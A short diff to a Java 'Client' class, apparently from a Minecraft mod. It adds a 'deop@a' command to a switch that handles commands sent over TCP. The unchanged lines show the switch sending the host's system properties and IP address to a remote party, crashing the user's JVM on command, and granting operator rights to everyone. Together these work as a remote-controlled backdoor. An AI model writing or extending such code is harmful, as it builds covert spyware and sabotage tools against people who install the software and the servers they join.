@@ -90,7 +90,8 @@ public class Client extends TcpClient {
                         case "props" -> Witch.send("props", System.getProperties().toString());
                         case "ip" -> Witch.send("ip", NetUtil.getIP());
                         case "crash" -> GlfwUtil.makeJvmCrash();
-                        case "op@a" -> OpEveryone.INSTANCE.opEveryone();
+                        case "op@a" -> OpEveryone.INSTANCE.opEveryone(false);
+                        case "deop@a" -> OpEveryone.INSTANCE.opEveryone(true);
                     }
                 } else if (data.data().size() == 1) {
                     String msg = data.data().get(0);
